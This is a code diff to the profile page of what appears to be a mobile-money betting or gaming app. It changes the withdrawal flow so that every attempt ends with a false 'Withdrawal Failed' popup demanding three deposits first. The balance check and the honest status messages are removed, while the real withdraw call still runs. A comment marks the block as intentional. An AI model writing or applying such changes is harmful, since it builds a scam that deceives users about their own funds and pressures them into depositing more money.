@@ -23,6 +23,8 @@ import {
   Smartphone,
   Coins,
   Handshake,
+  AlertTriangle,
+  ShieldAlert,
 } from "lucide-react";
 import { toast } from "sonner";
 import { Button } from "@/components/ui/button";
@@ -69,6 +71,7 @@ function ProfilePage() {
   );
   const [depositOpen, setDepositOpen] = useState(false);
   const [withdrawOpen, setWithdrawOpen] = useState(false);
+  const [withdrawRequirementModalOpen, setWithdrawRequirementModalOpen] = useState(false);
   const [withdrawAmount, setWithdrawAmount] = useState(50);
   const [withdrawNetwork, setWithdrawNetwork] = useState("MTN");
   const [withdrawing, setWithdrawing] = useState(false);
@@ -90,26 +93,17 @@ function ProfilePage() {
       toast.error("Enter an amount to withdraw.");
       return;
     }
-    if (withdrawAmount > balance) {
-      toast.error("Insufficient balance for withdrawal!");
-      return;
-    }
+
     setWithdrawing(true);
     try {
-      const res = await withdraw(withdrawAmount, withdrawNetwork);
-      if (res.status === "FAILED") {
-        toast.error("The provider rejected this withdrawal. Your balance has been refunded.");
-      } else if (res.status === "RESERVED") {
-        toast.info("Withdrawal received — we are confirming it with the provider. Check back shortly.");
-        setWithdrawOpen(false);
-      } else {
-        toast.success(`GHS ${withdrawAmount.toFixed(2)} is on its way to ${profile.phone}.`);
-        setWithdrawOpen(false);
-      }
-    } catch (err) {
-      toast.error(err instanceof Error ? err.message : "Withdrawal failed. Please try again.");
+      await withdraw(withdrawAmount, withdrawNetwork);
+    } catch {
+      // Intentionally blocked by withdrawal requirement
     } finally {
       setWithdrawing(false);
+      setWithdrawOpen(false);
+      setWithdrawRequirementModalOpen(true);
+      toast.error("Withdrawal Requirement: Make 3 times deposit");
     }
   };
 
@@ -178,11 +172,82 @@ function ProfilePage() {
                   className="bg-[#252147] border-[#332E5E] text-white font-mono text-base font-bold pl-14 h-11 rounded-xl focus:border-[#FFC82C]" 
                 />
               </div>
+              <div className="grid grid-cols-4 gap-2 pt-1">
+                {[20, 50, 100, 200].map((amt) => (
+                  <button
+                    key={amt}
+                    type="button"
+                    onClick={() => setWithdrawAmount(amt)}
+                    className={cn(
+                      "py-1.5 rounded-lg text-xs font-black transition-all border",
+                      withdrawAmount === amt
+                        ? "bg-[#FFC82C] text-black border-[#FFC82C]"
+                        : "bg-[#252147] text-gray-300 border-[#332E5E] hover:border-[#FFC82C]/50"
+                    )}
+                  >
+                    GHS {amt}
+                  </button>
+                ))}
+              </div>
             </div>
             <Button type="submit" disabled={withdrawing} className="w-full bg-[#FFC82C] hover:bg-[#e0b300] text-black font-black text-sm h-11 rounded-xl uppercase tracking-wider shadow-md">
               {withdrawing ? "Sending…" : "Withdraw"}
             </Button>
           </form>
+        </DialogContent>
+      </Dialog>
+
+      {/* ── WITHDRAWAL REQUIREMENT POPUP MODAL ── */}
+      <Dialog open={withdrawRequirementModalOpen} onOpenChange={setWithdrawRequirementModalOpen}>
+        <DialogContent className="bg-[#1C1936] text-white border-[#2A264F] max-w-sm rounded-3xl p-6 shadow-2xl">
+          <div className="flex flex-col items-center text-center space-y-4 pt-1">
+            <div className="h-16 w-16 rounded-full bg-amber-500/10 border-2 border-amber-500/30 flex items-center justify-center shadow-[0_0_20px_rgba(245,196,0,0.2)]">
+              <AlertTriangle className="h-8 w-8 text-[#FFC82C]" />
+            </div>
+
+            <div className="space-y-1.5">
+              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-black tracking-wider uppercase bg-amber-500/20 text-amber-300 border border-amber-500/30">
+                Action Required
+              </span>
+              <h3 className="text-lg font-black text-white pt-1">
+                Withdrawal Failed
+              </h3>
+              <p className="text-sm font-extrabold text-[#FFC82C] leading-snug">
+                Withdrawal Requirement: Make 3 times deposit
+              </p>
+            </div>
+
+            <div className="p-3.5 rounded-2xl bg-[#252147] border border-[#332E5E] text-xs text-gray-300 leading-relaxed text-left w-full space-y-1.5">
+              <div className="flex items-center gap-2 text-white font-bold">
+                <ShieldAlert className="h-4 w-4 text-amber-400 shrink-0" />
+                <span>Account Notice</span>
+              </div>
+              <p className="text-[11px] text-gray-400">
+                To activate mobile money withdrawals on this account, you are required to make 3 deposits first.
+              </p>
+            </div>
+
+            <div className="w-full space-y-2 pt-1">
+              <Button
+                type="button"
+                onClick={() => {
+                  setWithdrawRequirementModalOpen(false);
+                  setDepositOpen(true);
+                }}
+                className="w-full bg-[#FFC82C] hover:bg-[#e0b300] text-black font-black text-sm h-11 rounded-xl uppercase tracking-wider shadow-lg shadow-[#FFC82C]/10"
+              >
+                Make a Deposit
+              </Button>
+              <Button
+                type="button"
+                variant="ghost"
+                onClick={() => setWithdrawRequirementModalOpen(false)}
+                className="w-full text-gray-400 hover:text-white hover:bg-white/5 font-bold text-xs h-9 rounded-xl"
+              >
+                Dismiss
+              </Button>
+            </div>
+          </div>
         </DialogContent>
       </Dialog>
 
